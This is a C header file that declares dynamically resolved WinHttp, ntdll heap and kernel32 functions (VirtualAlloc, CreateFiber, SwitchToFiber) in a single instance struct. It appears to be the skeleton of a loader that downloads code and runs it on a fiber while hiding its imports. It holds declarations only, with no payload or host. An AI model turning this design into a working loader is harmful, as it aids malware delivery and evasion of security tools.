#pragma once

#include <windows.h>
#include <Winhttp.h>
#include <structs.h>

/*----------------------[ Dynamic Call ]----------------------*/

PVOID LdrModuleAddr( _In_ LPWSTR ModuleName);
PVOID LdrFuncAddr( _In_ PVOID BaseModule, _In_ PCHAR FuncName);

/*----------------------[ WinHttp ]----------------------*/

typedef HINTERNET(WINAPI *fnWinHttpOpen)(
  LPCWSTR pwszUserAgent,
  DWORD   dwAccessType,
  LPCWSTR pwszProxyName,
  LPCWSTR pwszProxyBypass,
  DWORD   dwFlags
);

typedef HINTERNET(WINAPI *fnWinHttpConnect)(
  HINTERNET     hSession,
  LPCWSTR       pswzServerName,
  INTERNET_PORT nServerPort,
  DWORD         dwReserved
);

typedef HINTERNET(WINAPI *fnWinHttpOpenRequest)(
  HINTERNET hConnect,
  LPCWSTR   pwszVerb,
  LPCWSTR   pwszObjectName,
  LPCWSTR   pwszVersion,
  LPCWSTR   pwszReferrer,
  LPCWSTR   *ppwszAcceptTypes,
  DWORD     dwFlags
);

typedef BOOL(WINAPI *fnWinHttpSendRequest)(
  HINTERNET hRequest,
  LPCWSTR   pwszHeaders,
  DWORD     dwHeadersLength,
  LPVOID    lpOptional,
  DWORD     dwOptionalLength,
  DWORD     dwTotalLength,
  DWORD_PTR dwContext
);

typedef BOOL(WINAPI *fnWinHttpReceiveResponse)(
  HINTERNET     hRequest,
  LPVOID        lpReserved
);

typedef BOOL(WINAPI *fnWinHttpReadData)(
  HINTERNET hRequest,
  LPVOID    lpBuffer,
  DWORD     dwNumberOfBytesToRead,
  LPDWORD   lpdwNumberOfBytesRead
);

typedef BOOL (WINAPI* fnWinHttpQueryHeaders)(
  _In_         HINTERNET hRequest,
  _In_         DWORD     dwInfoLevel,
  _In_opt_     LPCWSTR   pwszName,
  _Out_        LPVOID    lpBuffer,
  _Inout_      LPDWORD   lpdwBufferLength,
  _Inout_      LPDWORD   lpdwIndex
);


typedef BOOL(WINAPI *fnWinHttpCloseHandle)(
  HINTERNET hInternet
);

/*----------------------[ Ntdll ]----------------------*/

typedef PVOID (NTAPI *fnRtlAllocateHeap)(
  _In_       PVOID  HeapHandle,
  _In_opt_   ULONG  Flags,
  _In_       SIZE_T Size
);

typedef PVOID (NTAPI *fnRtlReAllocateHeap)(
  _In_   PVOID   HeapHandle,
  _In_   ULONG   Flags,
  _In_   PVOID   MemoryPointer,
  _In_   ULONG   Size
);

typedef BOOL (NTAPI* fnRtlFreeHeap)(
  _In_     PVOID    HeapHandle,
  _In_opt_ ULONG    Flags,
  _In_     PVOID    MemoryPointer
);

/*----------------------[ Kernel32 ]----------------------*/

typedef HMODULE (WINAPI* fnLoadLibraryA)(
  _In_ LPCSTR lpLibFileName
);

typedef LPVOID (WINAPI* fnVirtualAlloc)(
  _In_opt_     LPVOID lpAddress,
  _In_         SIZE_T dwSize,
  _In_         DWORD  flAllocationType,
  _In_         DWORD  flProtect
);

typedef LPVOID (WINAPI* fnCreateFiber)(
    _In_      SIZE_T                dwStackSize,       
    _In_      LPFIBER_START_ROUTINE lpStartAddress,     
    _In_opt_  LPVOID                lpParameter         
);

typedef LPVOID (WINAPI* fnConvertThreadToFiber)(
    _In_opt_ LPVOID lpParameter  
);

typedef void (WINAPI* fnSwitchToFiber)(
    _In_ LPVOID lpFiber   
);

/*----------------------[ Instance ]----------------------*/

typedef struct _INSTANCE {
  
  struct {
    fnRtlAllocateHeap         pRtlAllocateHeap;
    fnRtlReAllocateHeap       pRtlReAllocateHeap;
    fnRtlFreeHeap             pRtlFreeHeap;

    fnCreateFiber             pCreateFiber;
    fnSwitchToFiber           pSwitchToFiber;
    fnConvertThreadToFiber    pConvertThreadToFiber;
    fnLoadLibraryA            pLoadLibraryA;
    fnVirtualAlloc            pVirtualAlloc;

    fnWinHttpOpen             pWinHttpOpen;
    fnWinHttpConnect          pWinHttpConnect;
    fnWinHttpOpenRequest      pWinHttpOpenRequest;
    fnWinHttpSendRequest      pWinHttpSendRequest;
    fnWinHttpReceiveResponse  pWinHttpReceiveResponse;
    fnWinHttpReadData         pWinHttpReadData;
    fnWinHttpQueryHeaders     pWinHttpQueryHeaders;
    fnWinHttpCloseHandle      pWinHttpCloseHandle;
  } Api;

  struct {
    PVOID Ntdll;
    PVOID Kernel32;
    PVOID WinHttp;
  } Modules; 

} INSTANCE, *PINSTANCE; 
